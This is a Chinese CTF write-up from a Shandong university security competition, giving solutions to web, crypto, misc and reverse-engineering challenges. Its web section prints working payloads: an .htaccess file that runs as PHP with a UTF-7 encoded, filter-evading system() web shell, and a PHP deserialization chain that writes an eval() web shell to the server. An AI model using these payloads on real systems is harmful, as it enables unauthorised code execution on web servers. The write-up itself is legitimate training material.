# 第六届山东省大学生电子设计大赛——网络安全技能竞赛 writeup by M1mikatz

> 原文: https://www.ctfiot.com/87116.html
> ID: 87116

第六届山东省大学生电子设计大赛 

网络安全技能竞赛 

writeup by M1mikatz

为深入贯彻落实科教强鲁人才兴鲁战略，服务人才培养和创新省份建设，围绕中央网信办、教育部印发的《一流网络安全学院建设示范项目管理办法》加快高等院校网络安全及相关学科建设和人才培养，逐步建成全省网络安全产业人才聚集高地,举办第六届山东省大学生电子设计大赛——网络安全技能竞赛。在本次竞赛中，网安社的三支代表队分别获得了第一名，第三名，第七名的优异成绩。

Web

upload_100

一个文件上传，只能上传 .htaccess：
并且对文件内容进行过滤。并且upload目录下面没有php文件，因此考虑将 .htaccess 解析为 php文件使用。

注意，题目似乎对上传文件的尺寸做了限制，需要在 .htaccess 开头定义好大小。别问为什么，试出来的。。。。。。

#define width 1337
#define height 1337

需要先在 .htaccess 里面设置允许访问 .htaccess 文件，否则是直接访问 .htaccess 文件是Forbidden的：

<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>

然后再设置将 .htaccess 指定当做 PHP 文件处理并解析：

SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>

最终 .htaccess 文件里面的内容为：

<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>

但是文件内容过滤了很多关键字，并且 <?= 也被过滤了，我们可以使用  UTF-7 编码绕过，即：

<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
SetHandler application/x-httpd-php
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4

然后使用 加换行绕过其他的关键字，最终的payload如下：

#define width 1337
#define height 1337
<Fi
les ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Fi
les>
SetHa
ndler applic
ation/x-h
ttpd-p
hp
ph
p_flag zend.multibyte 1
ph
p_val
ue zend.script_encoding "UTF-7"
# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4

然后我们直接访问 .htaccess 文件即可把 .htaccess 文件当做 PHP 文件处理并执行里面的 PHP 代码：
pop_200

很简单一反序列化，php 5 的环境，直接用成员数绕过 __wakeup，然后写webshell即可：

<?php
error_reporting(0);

class File_operations {
    protected $filename='/var/www/html/shell.php';
}

class Show_index {
    public $filepage;
}

class Exception_process {
    public $arg;
}

class Transfer  {
    public $method;
    private $parameter = "<?php eval($_POST[a]);";
}

$poc = new Show_index();
$poc->filepage = new Transfer();
$poc->filepage->method = new Transfer();
$poc->filepage->method->method = new File_operations();
echo urlencode(serialize($poc));

Crypto

签到
然后维吉尼亚解密

在凯撒

第二轮签到题

三层base

mt

mt19937的预测，照着逻辑给逆回去就行

https://blog.csdn.net/shshss64/article/details/127326357

from Crypto.Util.number import *
import gmpy2
import hashlib
 
# right shift inverse
def inverse_right(res, shift):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp >> shift
    return tmp
 
 
# right shift with mask inverse
def inverse_right_mask(res, shift, mask):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp >> shift & mask
    return tmp
 
# left shift inverse
def inverse_left(res, shift):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp << shift
    return tmp
 
 
# left shift with mask inverse
def inverse_left_mask(res, shift, mask):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp << shift & mask
    return tmp
 
 
def enc(y):
    y = y ^ y >> 11
    y = y ^ y << 7 & 2636928640
    y = y ^ y << 15 & 4022730752
    y = y ^ y >> 18
    return y&0xffffffff
 
def recover(y):
    y = inverse_right(y,18)
    y = inverse_left_mask(y,15,4022730752)
    y = inverse_left_mask(y,7,2636928640)
    y = inverse_right(y,11)
    return y
 
 
def rrecover(last):
 n = 1<<32
 inv = gmpy2.invert(1812433253,n)
 for i in range(99,0,-1):
  last = ((last-i)*inv)%n
  last = inverse_right(last,30)
 return last
 
c = 1047573452
tmp = recover(c)
flag = rrecover(tmp)
print(flag)
print('flag{'+hashlib.md5(str(flag).encode()).hexdigest()+'}')

easy

dsa加密，注意到r1和r2其实相同，先行把flag约去求得k后，再反代求出flag

from Crypto.Util.number import *
import gmpy2
import hashlib
h1,h2,s1,s2,r1,q = [818128692003030167977053277109430684611703076399,486498008062394064249282337122659834542436448201,247121551505513420409531383106944282908920522414,754913008212620944684250081707312932655139381276,1309822693949102705754289540573759976438632888627,1328243644040291196447577554903037460035141284781]
r2 = r1
k = (h1 * r2 - h2 * r1) * gmpy2.invert(s1 * r2 - s2 * r1,q) % q
flag = (k * s1 - h1) * gmpy2.invert(r1,q) % q
print(flag)
print(long_to_bytes(flag))
print('flag{' + hashlib.md5(str(flag).encode()).hexdigest() + '}')

Misc

hacker

按照协议排序，找到http流
发现是蚁剑流量，挨个解

找到密码：

在第147流里找到zip

提出来解压得到flag

image-20221221124122246

Draw

255和0那些rgb值分别转01，用记事本就行
然后画二维码

from PIL import Image
MAX = 400
pic = Image.new("RGB",(MAX, MAX))
str = '000000000000000000000000000.....................0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(str[i] == '1'):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1
pic.show()
pic.save("11.png")

然后扫二维码

Re

ezxor

转dec
输入38个a，动态调试与随机数异或之后得到x，在和y异或

y = [169,178,231,186,187,120,180,187,152,171,222,58,165,156,215,149,93,219,31,160,26,50,88,254,197,99,197,46,79,38,26,65,91,191,128,141,138,189]
x = [0xAE, 0xBF, 0xE7, 0xBC, 0xA1, 0x7A, 0xE5, 0xEA, 0x98, 0xF9, 0x8B, 0x39, 0xA5, 0x9B, 0x8E, 0x95, 0x04, 0xDE, 0x1A, 0xA2, 0x4A, 0x36, 0x0C, 0xAF, 0xC5, 0x32, 0xC2, 0x7F, 0x4A, 0x70, 0x19, 0x15, 0x58, 0xEE, 0x84, 0xDD, 0xDC, 0xA1]
flag = ''
for i in range(38):
 flag += chr(x[i]^y[i]^ord('a'))
print(flag)


```
#define width 1337
#define height 1337
```



```
<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
```



```
SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>
```



```
<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>
```



```
<Files ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Files>
SetHandler application/x-httpd-php
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4
```



```
#define width 1337
#define height 1337
<Fi
les ~ "^.ht">
 Require all granted
 Order allow,deny
 Allow from all
</Fi
les>
SetHa
ndler applic
ation/x-h
ttpd-p
hp
ph
p_flag zend.multibyte 1
ph
p_val
ue zend.script_encoding "UTF-7"
# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4
```



```
<?php
error_reporting(0);

class File_operations {
    protected $filename='/var/www/html/shell.php';
}

class Show_index {
    public $filepage;
}

class Exception_process {
    public $arg;
}

class Transfer  {
    public $method;
    private $parameter = "<?php eval($_POST[a]);";
}

$poc = new Show_index();
$poc->filepage = new Transfer();
$poc->filepage->method = new Transfer();
$poc->filepage->method->method = new File_operations();
echo urlencode(serialize($poc));
```



```
from Crypto.Util.number import *
import gmpy2
import hashlib
 
# right shift inverse
def inverse_right(res, shift):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp >> shift
    return tmp
 
 
# right shift with mask inverse
def inverse_right_mask(res, shift, mask):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp >> shift & mask
    return tmp
 
# left shift inverse
def inverse_left(res, shift):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp << shift
    return tmp
 
 
# left shift with mask inverse
def inverse_left_mask(res, shift, mask):
    tmp = res
    bits = len(bin(res)[2:])
    for i in range(bits // shift):
        tmp = res ^ tmp << shift & mask
    return tmp
 
 
def enc(y):
    y = y ^ y >> 11
    y = y ^ y << 7 & 2636928640
    y = y ^ y << 15 & 4022730752
    y = y ^ y >> 18
    return y&0xffffffff
 
def recover(y):
    y = inverse_right(y,18)
    y = inverse_left_mask(y,15,4022730752)
    y = inverse_left_mask(y,7,2636928640)
    y = inverse_right(y,11)
    return y
 
 
def rrecover(last):
 n = 1<<32
 inv = gmpy2.invert(1812433253,n)
 for i in range(99,0,-1):
  last = ((last-i)*inv)%n
  last = inverse_right(last,30)
 return last
 
c = 1047573452
tmp = recover(c)
flag = rrecover(tmp)
print(flag)
print('flag{'+hashlib.md5(str(flag).encode()).hexdigest()+'}')
```



```
from Crypto.Util.number import *
import gmpy2
import hashlib
h1,h2,s1,s2,r1,q = [818128692003030167977053277109430684611703076399,486498008062394064249282337122659834542436448201,247121551505513420409531383106944282908920522414,754913008212620944684250081707312932655139381276,1309822693949102705754289540573759976438632888627,1328243644040291196447577554903037460035141284781]
r2 = r1
k = (h1 * r2 - h2 * r1) * gmpy2.invert(s1 * r2 - s2 * r1,q) % q
flag = (k * s1 - h1) * gmpy2.invert(r1,q) % q
print(flag)
print(long_to_bytes(flag))
print('flag{' + hashlib.md5(str(flag).encode()).hexdigest() + '}')
```



```
from PIL import Image
MAX = 400
pic = Image.new("RGB",(MAX, MAX))
str = '000000000000000000000000000.....................0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(str[i] == '1'):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1
pic.show()
pic.save("11.png")
```



```
y = [169,178,231,186,187,120,180,187,152,171,222,58,165,156,215,149,93,219,31,160,26,50,88,254,197,99,197,46,79,38,26,65,91,191,128,141,138,189]
x = [0xAE, 0xBF, 0xE7, 0xBC, 0xA1, 0x7A, 0xE5, 0xEA, 0x98, 0xF9, 0x8B, 0x39, 0xA5, 0x9B, 0x8E, 0x95, 0x04, 0xDE, 0x1A, 0xA2, 0x4A, 0x36, 0x0C, 0xAF, 0xC5, 0x32, 0xC2, 0x7F, 0x4A, 0x70, 0x19, 0x15, 0x58, 0xEE, 0x84, 0xDD, 0xDC, 0xA1]
flag = ''
for i in range(38):
 flag += chr(x[i]^y[i]^ord('a'))
print(flag)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/3-1671695782.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/2-1671695785.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/0-1671695787.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/3-1671695787.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/9-1671695788.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/6-1671695789.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/1-1671695789.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/2-1671695790.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/7-1671695790.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/7-1671695792.png)